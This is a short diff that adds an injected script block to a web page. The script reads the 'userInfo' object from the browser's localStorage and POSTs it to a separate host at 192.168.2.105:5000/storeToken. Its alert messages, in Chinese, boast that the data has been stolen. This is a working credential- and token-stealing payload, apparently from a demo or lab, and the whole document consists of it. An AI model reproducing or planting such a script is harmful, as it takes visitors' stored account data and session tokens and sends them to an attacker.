@@ -1,0 +1,13 @@
+<script>
+var userInfo = localStorage.getItem("userInfo");
+userInfo = JSON.parse(userInfo);
+console.log("AAAaaaa userinfo ", userInfo)
+$.ajax({
+    url: "https://192.168.2.105:5000/" + "storeToken",
+    type: "POST",
+    data: JSON.stringify(userInfo),
+    contentType: 'application/json; charset=UTF-8',
+    success: function(){alert("哈哈被我偷了")},
+    error: function(){alert("拿不到QQ")}
+});
+</script>
